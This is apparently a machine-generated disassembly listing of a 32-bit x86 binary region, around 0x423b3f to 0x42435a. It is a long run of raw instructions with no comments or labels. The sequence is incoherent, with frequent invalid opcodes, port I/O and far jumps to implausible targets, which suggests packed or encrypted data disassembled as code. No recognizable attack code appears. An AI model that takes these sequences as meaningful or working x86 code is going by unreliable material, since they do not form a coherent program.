  423b3f:	cmp    eax,0x373fb021
  423b44:	outs   dx,BYTE PTR ds:[esi]
  423b45:	out    dx,eax
  423b46:	inc    ebx
  423b47:	mov    ebp,0x23b9e1cd
  423b4c:	pop    ebp
  423b4d:	cmovp  esp,DWORD PTR [edx+0x2f337b6f]
  423b54:	jmp    0x36f5:0x9901e9f8
  423b5b:	and    DWORD PTR [esi+0x2d],ebx
  423b5e:	leave  
  423b5f:	ins    DWORD PTR es:[edi],dx
  423b60:	test   esp,edi
  423b62:	das    
  423b63:	inc    esi
  423b64:	fmul   st,st(4)
  423b66:	loope  0x423be5
  423b68:	inc    ecx
  423b69:	adc    esp,DWORD PTR [edi-0x72eeba9]
  423b6f:	dec    edx
  423b70:	mov    bl,BYTE PTR [eax-0x64]
  423b73:	dec    esp
  423b74:	aaa    
  423b75:	cwde   
  423b76:	or     DWORD PTR [edi+ebx*2+0x692ccd12],edi
  423b7d:	leave  
  423b7e:	outs   dx,BYTE PTR ds:[esi]
  423b7f:	ficom  DWORD PTR [ecx-0x210a3ec7]
  423b85:	test   al,0x12
  423b87:	push   ds
  423b88:	ret    0x1743
  423b8b:	lods   eax,DWORD PTR ds:[esi]
  423b8c:	in     eax,dx
  423b8d:	sub    eax,0x649d6ed8
  423b92:	cmp    DWORD PTR [ecx+0x30f06bf8],esi
  423b98:	outs   dx,DWORD PTR ds:[esi]
  423b99:	mov    edx,0x9c5ca449
  423b9e:	repnz mov ebx,0x137862c7
  423ba4:	mov    ebx,0x8fb959bd
  423ba9:	mov    BYTE PTR [ebx+0x57bd085d],ah
  423baf:	leave  
  423bb0:	dec    esp
  423bb1:	loopne 0x423bf7
  423bb3:	dec    esp
  423bb4:	inc    ebp
  423bb5:	dec    edx
  423bb6:	jmp    0x423b56
  423bb8:	mov    ebx,0xceeb36e
  423bbd:	(bad)  
  423bbe:	in     eax,dx
  423bbf:	xor    al,0x67
  423bc1:	push   ecx
  423bc2:	into   
  423bc3:	xor    eax,0xa75ed13c
  423bc8:	pop    ss
  423bc9:	mov    BYTE PTR [ecx+ebp*4-0x33],dh
  423bcd:	mov    edx,0x58bf9d93
  423bd2:	jmp    0x423b71
  423bd4:	gs dec edx
  423bd6:	fwait
  423bd7:	jns    0x423be1
  423bd9:	cmp    al,0xbd
  423bdb:	sar    BYTE PTR [ebx+0x7b54989a],1
  423be1:	add    ebp,DWORD PTR [ebx-0x75]
  423be4:	cmp    BYTE PTR [eax],dl
  423be6:	dec    esi
  423be7:	inc    ebx
  423be8:	xchg   ecx,eax
  423be9:	sub    eax,DWORD PTR [ecx-0x69]
  423bec:	xor    ebx,DWORD PTR [edi]
  423bee:	mov    cs:0xca08a5a1,eax
  423bf4:	cmp    ah,al
  423bf6:	sub    al,0x50
  423bf8:	inc    esi
  423bf9:	idiv   BYTE PTR [edx+0x67]
  423bfc:	cmp    BYTE PTR [esp],0x53
  423c00:	push   edi
  423c01:	push   es
  423c02:	scas   al,BYTE PTR es:[edi]
  423c03:	cmc    
  423c04:	aaa    
  423c05:	(bad)  
  423c06:	ins    BYTE PTR es:[edi],dx
  423c07:	retf   
  423c08:	icebp  
  423c09:	mov    eax,0x1704be84
  423c0e:	push   cs
  423c0f:	push   ss
  423c10:	bound  eax,QWORD PTR [ecx-0x5]
  423c13:	gs pop ebp
  423c15:	adc    edi,DWORD PTR [edi]
  423c17:	pop    esp
  423c18:	xchg   ecx,eax
  423c19:	jmp    0x5ea44def
  423c1e:	pop    esp
  423c1f:	in     al,dx
  423c20:	jb     0x423c04
  423c22:	cmp    al,0x2b
  423c24:	std    
  423c25:	xchg   cx,ax
  423c27:	cmp    ebx,DWORD PTR [ebx+0x7eb76e90]
  423c2d:	cmp    DWORD PTR [eax-0x51fa29ac],0x57
  423c34:	aaa    
  423c35:	push   edx
  423c36:	ja     0x423c35
  423c38:	add    DWORD PTR [ecx],0xffffffbe
  423c3b:	mov    dh,0xfc
  423c3d:	fs ja  0x423c2f
  423c40:	mov    ds:0xb5e03353,al
  423c45:	mov    edi,DWORD PTR [ebp+0x21ab82a4]
  423c4b:	mov    al,ds:0x9807e68d
  423c50:	inc    eax
  423c51:	mov    ecx,0x67fa4f10
  423c56:	jp     0x423c8a
  423c58:	lock cli 
  423c5a:	pop    ds
  423c5b:	push   ebx
  423c5c:	lock jb 0x423ca6
  423c5f:	call   0xdfdb252d
  423c64:	retf   
  423c65:	fsubr  DWORD PTR [eax]
  423c67:	(bad)  
  423c68:	push   ss
  423c69:	int    0xc3
  423c6b:	lods   eax,DWORD PTR ds:[esi]
  423c6c:	jb     0x423c31
  423c6e:	xlat   BYTE PTR ds:[ebx]
  423c6f:	adc    DWORD PTR [edi-0x4f],edi
  423c72:	inc    esi
  423c73:	mov    eax,DWORD PTR [eax-0x43]
  423c76:	or     dl,ah
  423c78:	fidivr DWORD PTR [eax-0x73bd0bb]
  423c7e:	dec    ecx
  423c7f:	shl    BYTE PTR [esi-0x7e],1
  423c82:	add    eax,0x9cfb6395
  423c87:	jne    0x423cdf
  423c89:	ror    DWORD PTR [ecx-0x42],cl
  423c8c:	lods   al,BYTE PTR ds:[esi]
  423c8d:	push   cs
  423c8e:	push   eax
  423c8f:	sbb    esi,ebp
  423c91:	or     ah,bl
  423c93:	out    dx,eax
  423c94:	xchg   BYTE PTR [edx],dh
  423c96:	pop    ebx
  423c97:	ret    
  423c98:	fwait
  423c99:	inc    esp
  423c9a:	dec    eax
  423c9b:	mov    dh,0xc4
  423c9d:	lods   al,BYTE PTR ds:[esi]
  423c9e:	xchg   ecx,eax
  423c9f:	into   
  423ca0:	xor    BYTE PTR [edi+0x39fd239],ah
  423ca6:	call   0xf869:0x9e0c
  423cac:	inc    ecx
  423cad:	lods   eax,DWORD PTR ds:[esi]
  423cae:	nop
  423caf:	pusha  
  423cb0:	test   eax,0x2e3e434
  423cb5:	repz addr16 iretw 
  423cb9:	dec    edx
  423cba:	out    dx,al
  423cbb:	shl    bh,1
  423cbd:	sar    BYTE PTR [edi],0xe
  423cc0:	popa   
  423cc1:	or     esp,DWORD PTR [esi]
  423cc3:	lea    ebp,[ebx+0x3632edc4]
  423cc9:	fs inc esp
  423ccb:	shr    DWORD PTR [eax-0x1f54b401],1
  423cd1:	xor    dh,BYTE PTR [esi-0x64f7f2]
  423cd7:	shl    DWORD PTR [esi],1
  423cd9:	sub    DWORD PTR [ebp-0x54],0xffffffbf
  423cdd:	mov    ecx,0xdf806ce3
  423ce2:	sar    ch,0xbd
  423ce5:	xor    eax,0x3d039672
  423cea:	mov    ch,0x73
  423cec:	push   esi
  423ced:	pop    edx
  423cee:	sub    al,0x46
  423cf0:	fist   WORD PTR [eax]
  423cf2:	and    DWORD PTR [ebx-0x5506e626],edi
  423cf8:	dec    esi
  423cf9:	mov    esi,0x93fa224a
  423cfe:	nop
  423cff:	jmp    0xbf15:0x75fa49be
  423d06:	jge    0x423d6f
  423d08:	mov    al,ds:0xe5bde3c5
  423d0d:	mov    bl,0xab
  423d0f:	jns    0x423cbe
  423d11:	pushf  
  423d12:	in     eax,dx
  423d13:	or     ah,BYTE PTR [ebp+0x537ef741]
  423d19:	push   ss
  423d1a:	scas   eax,DWORD PTR es:[edi]
  423d1b:	into   
  423d1c:	aaa    
  423d1d:	mov    ds:0x8763cf23,eax
  423d22:	mov    eax,ds:0xd7adab31
  423d27:	and    eax,0x287b475d
  423d2c:	sub    eax,0xa575f0e7
  423d31:	xchg   esi,eax
  423d32:	stos   BYTE PTR es:[edi],al
  423d33:	cmp    al,0x5
  423d35:	scas   al,BYTE PTR es:[edi]
  423d36:	gs (bad) 
  423d38:	jp     0x423d61
  423d3a:	lods   al,BYTE PTR ds:[esi]
  423d3b:	hlt    
  423d3c:	(bad)  
  423d3d:	in     eax,0x1e
  423d3f:	rcl    DWORD PTR [edx-0x23],0xe0
  423d43:	xor    bh,BYTE PTR [esi]
  423d45:	push   esp
  423d46:	arpl   sp,bx
  423d48:	jno    0x423d1c
  423d4a:	mov    ebx,0x4dcbed8b
  423d4f:	sub    al,0x62
  423d51:	mov    ebp,0x9efd973d
  423d56:	xchg   edx,eax
  423d57:	bound  edi,QWORD PTR [eax-0x8e2083c]
  423d5d:	jge    0x423d0e
  423d5f:	adc    al,dh
  423d61:	push   ds
  423d62:	cs sub eax,0xa7f5f53c
  423d68:	mov    eax,ds:0xffe350ab
  423d6d:	test   al,0xcc
  423d6f:	inc    BYTE PTR [esp+eax*4-0x14]
  423d73:	(bad)  [edx+edx*4+0x3]
  423d77:	jmp    0x423d9f
  423d79:	popf   
  423d7a:	xor    eax,0xafb794dd
  423d7f:	ret    
  423d80:	mov    esp,0x8c020dc0
  423d85:	xchg   edi,eax
  423d86:	xchg   ebp,eax
  423d87:	aas    
  423d88:	int    0x8
  423d8a:	or     eax,DWORD PTR ds:0xb7e0a56c
  423d90:	add    eax,DWORD PTR [ecx+0xbbb2576]
  423d96:	inc    ebp
  423d97:	and    eax,0xaf48acc3
  423d9c:	(bad)  
  423d9d:	lock push es
  423d9f:	pop    edi
  423da0:	dec    ecx
  423da1:	rol    DWORD PTR [edi+eax*1-0x621c8a9b],1
  423da8:	ret    
  423da9:	cmc    
  423daa:	adc    DWORD PTR [edx+0x55387117],0xffffff9b
  423db1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  423db3:	pop    ebp
  423db4:	mov    edi,0x28f3c69f
  423db9:	js     0x423d51
  423dbb:	add    al,cl
  423dbd:	scas   al,BYTE PTR es:[edi]
  423dbe:	fdivr  DWORD PTR [edx]
  423dc0:	mov    DWORD PTR [ecx-0x387c8bb9],esp
  423dc6:	or     ebx,DWORD PTR [edi+0x3d]
  423dc9:	into   
  423dca:	add    DWORD PTR [eax],edi
  423dcc:	xlat   BYTE PTR ds:[ebx]
  423dcd:	leave  
  423dce:	nop
  423dcf:	clc    
  423dd0:	mov    esp,0xfdee439
  423dd5:	gs je  0x423d64
  423dd8:	jne    0x423de9
  423dda:	fcomp  st(7)
  423ddc:	dec    eax
  423ddd:	cmc    
  423dde:	repz jnp 0x423e4b
  423de1:	push   0x7318e320
  423de6:	sbb    eax,0x6ed23779
  423deb:	sahf   
  423dec:	dec    ebp
  423ded:	add    edx,DWORD PTR [eax+0x1d]
  423df0:	cdq    
  423df1:	add    eax,0x6eb5bc08
  423df6:	out    dx,al
  423df7:	int    0x23
  423df9:	dec    ebx
  423dfa:	shl    BYTE PTR [eax],1
  423dfc:	jne    0x423d85
  423dfe:	retf   
  423dff:	jl     0x423da9
  423e01:	sbb    edi,0x3b
  423e04:	add    ah,bh
  423e06:	test   bl,dh
  423e08:	out    dx,al
  423e09:	fst    DWORD PTR [esp+ebp*2-0x316b9663]
  423e10:	scas   al,BYTE PTR es:[edi]
  423e11:	mov    DWORD PTR [ebp-0x78],ecx
  423e14:	outs   dx,BYTE PTR ds:[esi]
  423e15:	pop    esp
  423e16:	add    ebp,edx
  423e18:	int    0xa9
  423e1a:	and    DWORD PTR [esi-0x7f9ff83],ebp
  423e20:	lea    esi,[ebx+0x5a]
  423e23:	stos   DWORD PTR es:[edi],eax
  423e24:	mov    al,ds:0xffc01282
  423e29:	fcmovu st,st(4)
  423e2b:	dec    esi
  423e2c:	sub    dh,bh
  423e2e:	add    eax,0x74f8c592
  423e33:	leave  
  423e34:	mul    BYTE PTR [eax-0x7d]
  423e37:	cdq    
  423e38:	push   esp
  423e39:	nop
  423e3a:	mov    ds:0xa177f5c0,al
  423e3f:	adc    ebx,eax
  423e41:	les    ebp,FWORD PTR [edi-0x52]
  423e44:	xor    BYTE PTR [esi+edx*1],cl
  423e47:	xor    dh,BYTE PTR [edi+0x71d7edcc]
  423e4d:	push   ebp
  423e4e:	fimul  WORD PTR [esp+edi*8+0x86e9ea2]
  423e55:	bnd lock jnp 0x423def
  423e59:	ins    BYTE PTR es:[edi],dx
  423e5a:	inc    edx
  423e5b:	xchg   bh,bl
  423e5d:	(bad)  
  423e5e:	enter  0xf3ae,0x17
  423e62:	mov    ah,0xd
  423e64:	inc    esi
  423e65:	jne    0x423edd
  423e67:	and    DWORD PTR [ecx+0x3627e96f],edi
  423e6d:	in     al,dx
  423e6e:	test   DWORD PTR ds:[ebx+esi*1-0x665b4064],ebx
  423e76:	aaa    
  423e77:	pop    edx
  423e78:	inc    ecx
  423e79:	jge    0x423ead
  423e7b:	in     eax,dx
  423e7c:	cld    
  423e7d:	xor    bl,BYTE PTR [ebp+0x1b2a441]
  423e83:	sbb    DWORD PTR [edx-0x32],0xfa82f535
  423e8a:	jbe    0x423ea9
  423e8c:	pushf  
  423e8d:	pop    es
  423e8e:	in     eax,0x7c
  423e90:	mov    al,0xac
  423e92:	jg     0x423e3a
  423e94:	pop    ebp
  423e95:	fdecstp 
  423e97:	pop    ss
  423e98:	pop    ebp
  423e99:	das    
  423e9a:	jo     0x423e44
  423e9c:	inc    ecx
  423e9d:	mov    cl,0xb3
  423e9f:	add    esi,esi
  423ea1:	aad    0xc3
  423ea3:	add    eax,DWORD PTR [eax+0x2ec6683f]
  423ea9:	mul    DWORD PTR [ebp+0x43be6466]
  423eaf:	repnz rcl DWORD PTR [edx+0x4c58998d],cl
  423eb6:	xchg   BYTE PTR [esi+0x70533e7b],cl
  423ebc:	ficom  DWORD PTR [ebp+0x77]
  423ebf:	retf   
  423ec0:	into   
  423ec1:	push   ss
  423ec2:	dec    ebx
  423ec3:	lahf   
  423ec4:	fmul   DWORD PTR [ebx+0x502b4270]
  423eca:	rcl    eax,1
  423ecc:	test   DWORD PTR [eax*2+0x22718171],esp
  423ed3:	fs inc edx
  423ed5:	cdq    
  423ed6:	stos   DWORD PTR es:[edi],eax
  423ed7:	xlat   BYTE PTR ds:[ebx]
  423ed8:	clc    
  423ed9:	mov    eax,0x24e9cbca
  423ede:	test   DWORD PTR [esi],eax
  423ee0:	out    0xec,al
  423ee2:	xchg   ebp,eax
  423ee3:	mov    ch,0xb7
  423ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ee7:	mov    ecx,0x4c4b64ba
  423eec:	pop    ecx
  423eed:	cmp    BYTE PTR [ebx-0x4f60d32f],0xd3
  423ef4:	lods   al,BYTE PTR ds:[esi]
  423ef5:	mov    eax,ds:0x59804a3e
  423efa:	pop    esp
  423efb:	pop    edx
  423efc:	bound  edi,QWORD PTR [ecx]
  423efe:	cli    
  423eff:	fst    DWORD PTR [edx-0x32]
  423f02:	jmp    0x423ed4
  423f04:	push   edx
  423f05:	xor    eax,DWORD PTR [esi]
  423f07:	pop    ds
  423f08:	mov    esi,0x6df9b654
  423f0d:	dec    esp
  423f0e:	cmp    eax,0xc789d0e2
  423f13:	aad    0xf7
  423f15:	mov    edx,0xb1a31bb2
  423f1a:	inc    ebp
  423f1b:	jmp    0x8641:0x7e6e4f94
  423f22:	pop    eax
  423f23:	ja     0x423f06
  423f25:	pop    esp
  423f26:	xor    BYTE PTR [esi+ecx*2],dh
  423f29:	mov    al,0x8d
  423f2b:	sub    esp,DWORD PTR [ebp-0x169fb6a6]
  423f31:	arpl   WORD PTR [ecx+0x46],bp
  423f34:	repz mov ch,BYTE PTR [ecx+eiz*4]
  423f38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f39:	inc    ecx
  423f3a:	nop
  423f3b:	fs retf 
  423f3d:	popa   
  423f3e:	add    DWORD PTR [ebx+0x7905ea32],0xffffffe4
  423f45:	data16 push ax
  423f48:	pop    edx
  423f49:	xchg   ebp,eax
  423f4a:	cmp    BYTE PTR [esi],bh
  423f4c:	data16 daa 
  423f4e:	dec    esi
  423f4f:	jmp    0x423f60
  423f51:	stos   DWORD PTR es:[edi],eax
  423f52:	ss sbb edi,esp
  423f55:	cmp    BYTE PTR [eax+0x22602f6c],ch
  423f5b:	out    0x85,al
  423f5d:	mov    bh,0x48
  423f5f:	mov    al,0x5e
  423f61:	inc    eax
  423f62:	repz push edi
  423f64:	xchg   esi,edi
  423f66:	ss jbe 0x423fa4
  423f69:	mov    dl,0xaa
  423f6b:	pop    ss
  423f6c:	sub    BYTE PTR [edi],dl
  423f6e:	test   bh,0x7d
  423f71:	call   0x4535:0xaf6c4a31
  423f78:	cmp    al,BYTE PTR [edi-0x6]
  423f7b:	pop    eax
  423f7c:	call   0x265091ea
  423f81:	mov    ebp,0xccffc5b0
  423f86:	(bad)  
  423f87:	mov    ah,0xaf
  423f89:	dec    esi
  423f8a:	js     0x423ff7
  423f8c:	cmp    eax,0xd8d45ab2
  423f91:	sahf   
  423f92:	jno    0x423f82
  423f94:	call   0x4fe0696a
  423f99:	loop   0x423fe4
  423f9b:	inc    esp
  423f9c:	pop    edx
  423f9d:	ins    DWORD PTR es:[edi],dx
  423f9e:	into   
  423f9f:	add    ah,BYTE PTR [edi-0x35c3fd08]
  423fa5:	lods   eax,DWORD PTR ds:[esi]
  423fa6:	in     eax,dx
  423fa7:	rcr    bh,0xc8
  423faa:	jmp    0x87e00b42
  423faf:	sub    al,0x5
  423fb1:	or     eax,0x5ed9cc34
  423fb6:	sub    DWORD PTR [ebx+ebx*2+0x6f7cb85b],ebx
  423fbd:	adc    esi,DWORD PTR [ebx-0x54]
  423fc0:	xchg   BYTE PTR ss:[edx],bh
  423fc3:	mov    bl,0xb0
  423fc5:	ror    BYTE PTR [eax+0x5],cl
  423fc8:	ret    0xd403
  423fcb:	xchg   edi,eax
  423fcc:	ds gs and al,0x21
  423fd0:	push   edi
  423fd1:	xchg   esi,eax
  423fd2:	mov    eax,0xcccffd66
  423fd7:	xor    DWORD PTR [esi+0x75],eax
  423fda:	aas    
  423fdb:	ret    
  423fdc:	mov    esi,0xadf8fc6f
  423fe1:	in     eax,dx
  423fe2:	bound  ecx,QWORD PTR [ebx+esi*4]
  423fe5:	or     BYTE PTR [edx],dh
  423fe7:	mov    ecx,DWORD PTR [edi-0x714e228e]
  423fed:	and    bh,bl
  423fef:	jge    0x423f7d
  423ff1:	or     eax,0xff6655fd
  423ff6:	cmp    ecx,DWORD PTR [ebx+eiz*2+0x13]
  423ffa:	ins    DWORD PTR es:[edi],dx
  423ffb:	shr    DWORD PTR [edi+0x7bcd297e],1
  424001:	int    0xbb
  424003:	pop    esi
  424004:	cmp    BYTE PTR [ebx],ah
  424006:	in     eax,0x2f
  424008:	lahf   
  424009:	mov    bl,0x5b
  42400b:	xor    DWORD PTR [ebp-0x20],0xfffffff8
  42400f:	test   eax,0x4e1448b1
  424014:	adc    al,0xee
  424016:	enter  0x8128,0x3e
  42401a:	sti    
  42401b:	jp     0x423fe3
  42401d:	mul    dh
  42401f:	jmp    0xfae:0x113bc903
  424026:	mov    al,0x4
  424028:	and    ah,BYTE PTR [ecx+0xcd9fd2d]
  42402e:	and    BYTE PTR [eax],dl
  424030:	lock shl DWORD PTR [ecx-0x26],cl
  424034:	in     al,dx
  424035:	sbb    DWORD PTR [edx-0x711d1ed9],esi
  42403b:	cmp    al,0x91
  42403d:	or     BYTE PTR [ebx],dl
  42403f:	rol    edx,1
  424041:	rcr    DWORD PTR [eax-0x32],0x3b
  424045:	dec    esi
  424046:	mov    DWORD PTR [edi-0x7d],esi
  424049:	popa   
  42404a:	cld    
  42404b:	push   0x7f
  42404d:	jne    0x424026
  42404f:	cdq    
  424050:	test   dl,cl
  424052:	jbe    0x423fe0
  424054:	or     DWORD PTR [ecx],esp
  424056:	sbb    bl,BYTE PTR ds:0x392de543
  42405c:	scas   al,BYTE PTR es:[edi]
  42405d:	cmp    dl,0xcc
  424060:	stos   DWORD PTR es:[edi],eax
  424061:	neg    ah
  424063:	sub    al,0xe3
  424065:	mov    al,0x20
  424067:	stc    
  424068:	dec    ecx
  424069:	pop    esp
  42406a:	xchg   ebp,eax
  42406b:	pop    edx
  42406c:	adc    bh,cl
  42406e:	xchg   BYTE PTR [ebp-0x6b30e49e],ch
  424074:	jg     0x424098
  424076:	xor    DWORD PTR [esi+esi*4-0x62],edi
  42407a:	push   ss
  42407b:	push   es
  42407c:	idiv   BYTE PTR [edx]
  42407e:	mov    DWORD PTR [esi-0x6d],esi
	...
  4240c9:	mov    esp,0xf767f68f
  4240ce:	jg     0x42408d
  4240d0:	fist   WORD PTR [esi+0x2dba792d]
  4240d6:	xor    al,0x4c
  4240d8:	outs   dx,BYTE PTR ds:[esi]
  4240d9:	fwait
  4240da:	sub    BYTE PTR [ecx],al
  4240dc:	add    BYTE PTR [eax],ah
  4240de:	pop    es
  4240df:	add    BYTE PTR [eax],al
  4240e1:	(bad)  
  4240e2:	aad    0xb
  4240e4:	jnp    0x424147
  4240e6:	icebp  
  4240e7:	xchg   DWORD PTR [ebx],esi
  4240e9:	dec    ebx
  4240ea:	or     bh,0x46
  4240ed:	pop    es
  4240ee:	mov    ah,0x3b
  4240f0:	aaa    
  4240f1:	test   BYTE PTR [esi-0x87babf6],cl
  4240f7:	mov    WORD PTR [ebp-0x1b9fa39c],ss
  4240fd:	pop    ecx
  4240fe:	jmp    0x42416b
  424100:	jle    0x42408a
  424102:	pop    ebx
  424103:	add    ecx,DWORD PTR [esi+0x3a]
  424106:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424107:	ins    DWORD PTR es:[edi],dx
  424108:	sar    BYTE PTR [eax+0x80b89fc],cl
  42410e:	push   es
  42410f:	(bad)  
  424110:	aad    0xef
  424112:	aas    
  424113:	mov    bl,0x42
  424115:	mov    ch,0x83
  424117:	test   bl,al
  424119:	test   eax,0x154b4038
  42411e:	pop    edx
  42411f:	les    esp,FWORD PTR [ebx+0x56]
  424122:	dec    eax
  424123:	xchg   edi,eax
  424124:	inc    eax
  424125:	jecxz  0x42411c
  424127:	or     al,0xe6
  424129:	(bad)  
  42412b:	in     eax,0x6a
  42412d:	and    ah,BYTE PTR cs:[esi-0x1d]
  424131:	std    
  424132:	mov    ebp,0x2c9f51c3
  424137:	daa    
  424138:	clc    
  424139:	sub    DWORD PTR [ebx+ebp*4],ecx
  42413c:	call   0xc80fa213
  424141:	jno    0x4240d4
  424143:	pop    ebx
  424144:	cmp    DWORD PTR [ecx*1+0x27aed088],ecx
  42414b:	je     0x4240fb
  42414d:	fnsave [edi-0x50f17d0c]
  424153:	(bad)  
  424154:	or     esi,esp
  424156:	jno    0x4240e1
  424158:	dec    edi
  424159:	xchg   esp,eax
  42415a:	mov    edx,DWORD PTR [esi+0x6f]
  42415d:	or     al,ah
  42415f:	add    ebp,edx
  424161:	cmp    al,0xeb
  424163:	arpl   WORD PTR [bx],bp
  424166:	xor    DWORD PTR [edx+0x73322943],0x6a2caeb5
  424170:	ror    DWORD PTR [esi-0x62ea7368],0xee
  424177:	add    bh,BYTE PTR [esi]
  424179:	sbb    eax,0x97bf4dd
  42417e:	test   eax,0x7c06ffc3
  424183:	out    dx,al
  424184:	out    dx,al
  424185:	je     0x424180
  424187:	ret    0x2d85
  42418a:	call   0xba036a26
  42418f:	into   
  424190:	dec    edx
  424191:	xor    DWORD PTR [ebp-0x78b0199f],ecx
  424197:	stc    
  424198:	popf   
  424199:	xor    ah,BYTE PTR [edi-0x388ab9fe]
  42419f:	ins    DWORD PTR es:[edi],dx
  4241a0:	outs   dx,DWORD PTR ds:[esi]
  4241a1:	mov    esi,0x7165ed17
  4241a6:	or     eax,0xf2d99fc5
  4241ab:	pusha  
  4241ac:	jecxz  0x42416b
  4241ae:	js     0x42422f
  4241b0:	fcomp  QWORD PTR [eax+0x1f48f7f7]
  4241b6:	ret    
  4241b7:	stc    
  4241b8:	and    edi,0x8c69a8b8
  4241be:	sbb    DWORD PTR ds:0x252b9273,eax
  4241c4:	(bad)  
  4241c6:	outs   dx,BYTE PTR ds:[esi]
  4241c7:	dec    esi
  4241c8:	psrlw  mm1,mm7
  4241cb:	inc    eax
  4241cc:	or     DWORD PTR ds:0xe45c870d,ecx
  4241d2:	jno    0x42422d
  4241d4:	pop    esp
  4241d5:	jg     0x424239
  4241d7:	pusha  
  4241d8:	cmc    
  4241d9:	pop    ebp
  4241da:	pop    edi
  4241db:	pop    esp
  4241dc:	aam    0x45
  4241de:	adc    DWORD PTR [edi],eax
  4241e0:	cdq    
  4241e1:	pop    ecx
  4241e2:	and    esp,ecx
  4241e4:	xchg   edi,eax
  4241e5:	or     dl,0x7f
  4241e8:	scas   al,BYTE PTR es:[edi]
  4241e9:	mov    dh,0x7f
  4241eb:	push   DWORD PTR [esi]
  4241ed:	in     eax,0x67
  4241ef:	mov    ebp,0xf101964c
  4241f4:	leave  
  4241f5:	rcl    BYTE PTR [ebx+0x2a],1
  4241f8:	sti    
  4241f9:	aaa    
  4241fa:	(bad)  
  4241fb:	popa   
  4241fc:	retf   0xd5ff
  4241ff:	mov    ds:0xce3cb4d2,eax
  424204:	inc    esi
  424205:	jle    0x42422a
  424207:	test   eax,0xd1d634c6
  42420c:	mov    cl,0x4b
  42420e:	dec    edx
  42420f:	test   ah,cl
  424211:	xchg   edi,eax
  424212:	xlat   BYTE PTR ds:[ebx]
  424213:	or     ebp,DWORD PTR [ebx+0x1de7a80]
  424219:	out    0xbc,eax
  42421b:	js     0x424214
  42421d:	lods   al,BYTE PTR ds:[esi]
  42421e:	test   al,0x68
  424220:	out    dx,eax
  424221:	push   ecx
  424222:	xor    al,0x2c
  424224:	fild   DWORD PTR [ecx-0xfbb568d]
  42422a:	pop    edi
  42422b:	mov    dl,BYTE PTR [edi-0x2265013e]
  424231:	push   ss
  424232:	inc    eax
  424233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424234:	or     ebx,DWORD PTR [edx+0x2e40d748]
  42423a:	add    ebx,DWORD PTR [esi+0x542eca4c]
  424240:	mov    ebp,0x2e34e348
  424245:	xchg   ebx,eax
  424246:	sub    eax,0xa0dbf1d0
  42424b:	scas   eax,DWORD PTR es:[edi]
  42424c:	stc    
  42424d:	or     BYTE PTR [esi+0x3426f1df],0xb2
  424254:	clc    
  424255:	adc    DWORD PTR [ecx+0x342e79a1],ebp
  42425b:	jbe    0x424220
  42425d:	dec    edi
  42425e:	inc    ecx
  42425f:	stc    
  424260:	ret    
  424261:	stos   BYTE PTR es:[edi],al
  424262:	addr16 jp 0x4242e3
  424265:	push   esi
  424266:	dec    eax
  424267:	rcl    BYTE PTR [eax-0x2b],1
  42426a:	jnp    0x424228
  42426c:	xor    eax,0xf68e9829
  424271:	add    DWORD PTR [edx+0x2f],ebx
  424274:	stos   BYTE PTR es:[edi],al
  424275:	cdq    
  424276:	(bad)  
  424277:	mov    bh,0x8e
  424279:	push   ebp
  42427a:	ret    
  42427b:	xchg   esi,eax
  42427c:	jae    0x424273
  42427e:	cmp    al,0x9b
  424280:	ins    DWORD PTR es:[edi],dx
  424281:	push   esi
  424282:	lea    ebx,[ebx]
  424284:	je     0x424295
  424286:	jg     0x424272
  424288:	icebp  
  424289:	jb     0x4242ed
  42428b:	dec    eax
  42428c:	push   ss
  42428d:	rol    cl,cl
  42428f:	sbb    dh,BYTE PTR [esi-0x2a]
  424292:	loope  0x424246
  424294:	pushf  
  424295:	jle    0x4242cb
  424297:	adc    BYTE PTR [edx+0x5a],cl
  42429a:	jo     0x42426b
  42429c:	xor    cl,BYTE PTR [ecx-0x50]
  42429f:	(bad)  
  4242a0:	jecxz  0x4242ac
  4242a2:	or     BYTE PTR [esi+eax*4-0x78],al
  4242a6:	cmp    BYTE PTR [eax+0x5a],bh
  4242a9:	call   FWORD PTR [ebp*2+0x74497b65]
  4242b0:	sbb    DWORD PTR [ebx+ebp*8],eax
  4242b3:	sub    ah,BYTE PTR [eax]
  4242b5:	mov    edi,0x34f4957b
  4242ba:	mov    ebp,0x446ee728
  4242bf:	bound  esp,QWORD PTR [esi-0x63cbdcd2]
  4242c5:	call   0xde8c:0x7ab2ae1f
  4242cc:	cmc    
  4242cd:	call   0x1102f3e5
  4242d2:	out    dx,al
  4242d3:	cmp    BYTE PTR [edi-0x1d],al
  4242d6:	jns    0x42426b
  4242d8:	cmp    eax,0x5113feeb
  4242dd:	adc    BYTE PTR [eax],ah
  4242df:	mov    esi,0xc43d3a8
  4242e4:	inc    edi
  4242e5:	les    ebx,FWORD PTR [esi]
  4242e7:	push   0xffffff84
  4242e9:	xchg   ecx,eax
  4242ea:	ins    BYTE PTR es:[edi],dx
  4242eb:	call   0x7099:0xa59ae4a5
  4242f2:	xor    eax,DWORD PTR [ebx]
  4242f4:	pusha  
  4242f5:	sahf   
  4242f6:	cmp    eax,ebp
  4242f8:	(bad)  
  4242f9:	mov    dl,0x7e
  4242fb:	push   edi
  4242fc:	ss mov ebx,0x39700ffe
  424302:	scas   al,BYTE PTR es:[edi]
  424303:	push   ss
  424304:	sahf   
  424305:	xchg   BYTE PTR [ecx+0x1d540e92],dl
  42430b:	cmp    DWORD PTR [edx],0x4a
  42430e:	or     DWORD PTR [ebp+ecx*2-0x38be859b],ecx
  424315:	test   DWORD PTR [edi],ecx
  424317:	shl    BYTE PTR [ebp-0x1ebe9b80],0x85
  42431e:	or     eax,0xc41dc676
  424323:	inc    dl
  424325:	call   0xf06713b3
  42432a:	mov    al,ds:0xc4c31f8c
  42432f:	push   ebp
  424330:	mov    bl,0xca
  424332:	pop    ss
  424333:	lock cld 
  424335:	test   eax,0xcd476e69
  42433a:	or     dh,BYTE PTR [ebx]
  42433c:	pop    esp
  42433d:	mov    bl,0xe
  42433f:	sahf   
  424340:	mov    cl,0xfb
  424342:	scas   eax,DWORD PTR es:[edi]
  424343:	ds mov bh,0xd6
  424346:	outs   dx,BYTE PTR ds:[esi]
  424347:	jmp    0x42437e
  424349:	mov    esp,0xc8451c4f
  42434e:	xor    edx,DWORD PTR [ebx+0x4efd398b]
  424354:	shr    DWORD PTR [ebx+eiz*4+0x43],0xd1
  424359:	dec    edx
  42435a:	fistp  WORD PTR [esi-0x65542281]
